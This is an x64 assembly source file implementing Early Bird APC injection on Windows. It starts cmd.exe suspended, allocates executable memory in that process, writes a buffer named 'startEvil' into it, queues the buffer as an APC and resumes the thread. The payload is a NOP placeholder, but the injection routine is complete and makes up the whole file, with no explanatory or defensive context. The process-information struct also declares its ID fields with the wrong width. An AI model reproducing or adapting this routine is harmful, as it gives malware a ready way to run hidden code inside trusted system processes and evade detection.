; windows_injection_earlybird.asm

extrn GetLastError :PROC
extrn ExitProcess :PROC
extrn CreateProcessA :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn QueueUserAPC :PROC
extrn ResumeThread :PROC

_STARTUPINFOA STRUCT
    cb              DWORD ?
    padding1        DB 4 DUP (?)
    lpReverved      QWORD ?
    lpDesktop       QWORD ?
    lpTitle         QWORD ?
    dwX             DWORD ?
    dwY             DWORD ?
    dwXSize         DWORD ?
    dwYSize         DWORD ?
    dwXCountChars   DWORD ?
    dwYCountChars   DWORD ?
    dwFillAttribute DWORD ?
    dwFlags         DWORD ?
    wShowWindow     WORD ?
    cbReverved2     WORD ?
    padding2        DB 4 DUP (?)
    lpReserved2     QWORD ?
    hStdInput       QWORD ?
    hStdOutput      QWORD ?
    hStdError       QWORD ?
_STARTUPINFOA ENDS

_PROCESS_INFORMATION STRUCT
    hProcess        QWORD ?
    hThread         QWORD ?
    dwProcessID     QWORD ?
    dwThreadID      QWORD ?
_PROCESS_INFORMATION ENDS

.data
    legitBinary     DB "C:\Windows\System32\cmd.exe", 0
    startInfo       _STARTUPINFOA <>
    procInfo        _PROCESS_INFORMATION <>
    memAlloc        DQ ?
    startEvil       DB 90h, 90h, 90h, 90h, 90h, 90h
    endEvil         DB 0
    sizeEvil        DQ ?

.code
Start PROC
    SUB     rsp, 28h

_CreateProcessA:
    XOR     rcx, rcx
    LEA     rdx, legitBinary
    XOR     r8, r8
    XOR     r9, r9
    SUB     rsp, 50h
    XOR     rax, rax
    MOV     [rsp+32], rax
    MOV     rax, 4
    MOV     [rsp+40], rax
    XOR     rax, rax
    MOV     [rsp+48], rax
    MOV     [rsp+56], rax
    LEA     rax, startInfo
    MOV     [rsp+64], rax
    LEA     rax, procInfo
    MOV     [rsp+72], rax
    CALL    CreateProcessA
    ADD     rsp, 50h
    CMP     rax, 0
    JZ      _exit

_calculateSizeEvil:
    LEA     rax, startEvil
    LEA     rbx, endEvil
    SUB     rbx, rax
    MOV     sizeEvil, rbx

_VirtualAllocEx:
    MOV     rcx, procInfo.hProcess
    XOR     rdx, rdx
    MOV     r8, sizeEvil
    MOV     r9, 3000h
    SUB     rsp, 28h
    MOV     rax, 40h
    MOV     [rsp+32], rax
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    MOV     memAlloc, rax

_WriteProcessMemory:
    MOV     rcx, procInfo.hProcess
    MOV     rdx, memAlloc
    LEA     r8, startEvil
    MOV     r9, sizeEvil
    SUB     rsp, 28h
    XOR     rax, rax
    MOV     [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

_QueueUserAPC:
    MOV     rcx, memAlloc
    MOV     rdx, procInfo.hThread
    XOR     r8, r8
    CALL    QueueUserAPC
    CMP     rax, 0
    JE      _exit

_ResumeThread:
    MOV     rcx, procInfo.hThread
    CALL    ResumeThread

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess

Start ENDP
END